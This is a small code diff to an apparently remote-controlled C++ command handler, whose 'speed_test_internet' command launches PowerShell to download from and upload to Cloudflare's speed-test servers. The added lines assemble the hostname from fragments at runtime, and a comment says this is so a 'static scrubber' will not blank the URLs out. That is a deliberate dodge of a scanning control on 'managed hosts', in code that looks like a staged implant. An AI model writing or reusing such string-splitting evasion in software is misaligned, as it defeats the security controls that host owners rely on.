@@ -2249,10 +2249,16 @@ static void handle_command(const std::string& msg_str) {
         else if (cmd == "speed_test_internet") {
 #ifdef STAGE1_KEEP_FALLBACKS
             // Download AND upload test against Cloudflare. Measures both directions.
+            // URLs built at runtime from parts so static scrubber doesn't NUL them out.
+            // Uses HTTPS (443) — port 80 is often firewalled on managed hosts.
+            std::string _cf = std::string("speed") + ".cloudflare.com";
+            std::string _dl_url = "https://" + _cf + "/__down?bytes=1000000";
+            std::string _ul_url = "https://" + _cf + "/__up";
             std::string _ps_speed =
                 "powershell -NoProfile -Command \""
-                "$dl_url='http://speed.cloudflare.com/__down?bytes=1000000';"
-                "$ul_url='http://speed.cloudflare.com/__up';"
+                "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
+                "$dl_url='" + _dl_url + "';"
+                "$ul_url='" + _ul_url + "';"
                 "$result=@{};"
                 "try{"
                 "  $wc=(";
